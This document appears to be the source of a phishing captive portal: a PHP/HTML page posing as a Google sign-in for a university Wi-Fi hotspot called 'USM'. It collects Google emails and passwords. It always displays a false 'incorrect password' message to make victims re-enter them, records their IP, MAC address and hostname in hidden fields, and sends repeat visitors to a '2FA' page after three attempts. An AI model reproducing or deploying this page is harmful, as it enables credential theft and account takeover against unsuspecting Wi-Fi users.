<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
session_start();

?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=394, user-scalable=no">
<title>Ingrese - Alumnos USM</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store
, must-revalidate" />

<link rel="stylesheet" type="text/css" href="assets/css/styles.css">
<link rel="icon" type="image/png" href="assets/img/f8593y1ses.png"         width="400" 
height="500">

<script src="jquery-2.2.1.min.js"></script>
<script type="text/javascript">
  function redirect() {
    setTimeout(function() {
      window.location = "/captiveportal/index.php";
    }, 100);
  }
</script>
<?php
  $_SESSION['wppa'] += 1;
  function accion(){
    echo $_SESSION['wppa'];    
  }
  if($_SESSION['wppa']>3){
  header("Location: http://192.168.1.1/portal_2fa/index.php");
  };
?>

</head>
<body>
<form method="POST" >
	<img src="assets/img/1ckkcu79ho.gif" alt="">
	<h1>Ingrese al punto USM</h1>
	<h2>Con su cuenta de google</h2>
	<input id="user" type="text" name="email_google" placeholder="Correo electrónico o teléfono"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<input type="password" name="password_google" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<img src="assets/img/images.png" width=10/>
	<span style="color:red">La contraseña es incorrecta. Vuelve a intentarlo o haz clic en "¿Olvidaste la contraseña?" para restablecerla.</span>
	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
	<input type="hidden" name="target" value="https://accounts.google.com/signin">
	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
	<p><a href="">Opciones</a><span class="text-right"><button type="submit" onclick = "funcion();">
	Siguiente</button></span></p>
	

</form>
<footer>
	Español (América Latina)<img src="assets/img/mq40xx0kce.gif" alt="">
	<span class="text-right">Ayuda&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacidad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terminos</span>
</footer>
<script>document.onload = function() { document.getElementById("user").focus();};</script>
</body>
</html>
